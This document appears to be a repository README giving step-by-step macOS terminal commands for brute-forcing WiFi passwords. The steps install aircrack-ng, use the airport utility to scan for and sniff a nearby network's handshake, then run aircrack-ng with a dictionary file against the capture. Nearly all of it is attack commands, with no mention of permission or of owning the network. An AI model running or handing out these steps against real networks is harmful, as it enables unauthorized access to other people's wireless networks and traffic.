# WIFI_BruteForce-attacks

Using java to create passcode dictionary.
And use "aircrack" to brute force WIFI passcode.

My version:
OS Requird: MAC 
Install "MacPorts" on your labtops.
Open Terminal enter following commands:

Install aircrack:
- sudo port install aircrack-ng

Create aircrack link:
- sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport

Search Local WIFI:
- airport -s

Catch WIFI listener package (XX stand for channel number):
- sudo airport en0 sniff XX 

Exit WIFI listener:
- "CONTROL + C"

After it, go to finder "GO TO FOLDER"
- /tmp

There will be *.cap file was create. 

Move the *.cap file and your WIFI passcode *.txt file to a same folder.

Enter following command to check if Encryption (1 handshake) is mean catch passcode successed,
if Encryption (0 handshake) is mean catch passcode unsuccessed.

- aircrack-ng -w *.txt *.cap

If Encryption contain (1 handshake), enter the number of the line, and then start brute force WIFI passcode.
